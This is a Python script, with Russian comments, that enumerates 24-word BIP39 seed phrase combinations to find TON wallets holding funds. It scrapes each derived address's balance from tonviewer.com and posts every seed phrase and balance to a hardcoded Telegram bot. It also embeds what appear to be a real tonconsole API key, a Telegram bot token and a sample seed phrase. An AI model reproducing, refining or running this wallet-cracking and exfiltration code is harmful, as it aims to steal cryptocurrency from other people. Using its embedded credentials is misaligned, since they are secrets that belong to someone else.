from urllib.parse import quote
from tonutils.client import TonapiClient
from tonutils.utils import to_amount
from tonutils.wallet import WalletV5R1
import asyncio
from bs4 import BeautifulSoup
import requests, re, time
from itertools import product


# Api ключ от tonconsole
api_key = "AHNHIPIG5QGH35YAAAAMBPWAM2GZMYUF2Z6MNLZJV5LGFECWGQRLBAOSD3LEBN7PQ454BVA"
# Выбор сети
is_testnet = False
# Файл с фразами
file_path = "seed_phrases.txt"
# Файл для сохранения результатов
output_file = "balance_results.txt"
# Файл для валидных кошельков
valid_seeds_file = "valid_seed.txt"
with open("bip39.txt", "r") as f:
    words = f.read().split(" ")
async def check_wallet_balance(client, seed):
    try:
        # Создание кошелька
        wallet, public_key, private_key, mnemonic = WalletV5R1.from_mnemonic(client, seed)
        print(f"Address: {wallet.address.to_str()}")
        url = "https://tonviewer.com/"+wallet.address.to_str()
        response = requests.get(url)
        if response.status_code != 200:
            print("Ошибка загрузки страницы")
            time.sleep(10)
        
        # Парсим HTML
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # 1. Находим div, где есть текст "Balance"
        balance_div = soup.find(lambda tag: tag.name == 'div' and tag.get_text(strip=True) == "Balance")
        
        ton_div = balance_div.find_next(lambda tag: tag.name == 'div' and "TON" in tag.get_text())
        
        if ton_div:
            ton_match = re.search(r"(\d+\.\d+)", ton_div.get_text(strip=True))
            if ton_match:
                print(float(ton_match.group(1)))
                return float(ton_match.group(1)), None
    except Exception as e:
        return None, str(e)

async def main() -> None:
    client = TonapiClient(api_key=api_key, is_testnet=is_testnet)
    # Начальные значения переменных
    total_balance = 0
    wallets_with_balance = 0
    wallets_with_zero_balance = 0
    failed_wallets = 0
    error_messages = {}

    # Чтение сид-фраз из файла
    # with open(file_path, "r") as file:
        # seed_phrases = [line.strip().split() for line in file if line.strip()]

    total_wallets = 0

    with open(output_file, "w") as outfile, open(valid_seeds_file, "w") as valid_file:
        for combo in product(words, repeat=24):
            total_wallets+=1
            seed_str = " ".join(combo)
            #seed_str="dial door welcome media nice nominee boost desert tortoise vicious already sample battle funny miss much suspect pass eye secret health chuckle kingdom fever"
            #combo=seed_str.split(" ")
            outfile.write("======================\n")
            outfile.write(f"Сид-фраза: {seed_str}\n")
            
            try:
                balance_amount, error = await check_wallet_balance(client, combo)
                
                if error:
                    failed_wallets += 1
                    error_messages[error] = error_messages.get(error, 0) + 1
                    outfile.write(f"Ошибка: {error}\n")
                    print(f"Ошибка для {seed_str}: {error}")
                    continue
                prompt=f"Баланс для {seed_str}: {balance_amount}"
                requests.get(f"https://api.telegram.org/bot8173054236:AAFVqnTIlzX6eYMIF03UJeAKaqmdTlDmKAk/sendMessage?chat_id=1046292733&text={quote(prompt, safe='')}")
                # Запись валидной сид-фразы
                valid_file.write(seed_str + "\n")
                
                # Обновление статистики
                total_balance += balance_amount
                if balance_amount > 0:
                    wallets_with_balance += 1
                else:
                    wallets_with_zero_balance += 1
                
                outfile.write(f"Баланс: {balance_amount}\n")
                print(f"Баланс для {seed_str}: {balance_amount}")
                
            except Exception as e:
                failed_wallets += 1
                error_msg = str(e)
                error_messages[error_msg] = error_messages.get(error_msg, 0) + 1
                outfile.write(f"Критическая ошибка: {error_msg}\n")
                print(f"Критическая ошибка для {seed_str}: {error_msg}")

    # Вывод статистики
    print("\n======== Общая статистика ========")
    print(f"Общее количество кошельков: {total_wallets}")
    print(f"Общий баланс: {total_balance} TON")
    print(f"Кошельков с балансом > 0: {wallets_with_balance}")
    print(f"Кошельков с балансом 0: {wallets_with_zero_balance}")
    print(f"Не удалось проверить: {failed_wallets}")
    
    if error_messages:
        print("\n======== Частые ошибки ========")
        for error, count in error_messages.items():
            print(f"{count} × {error}")

if __name__ == "__main__":
    asyncio.run(main())
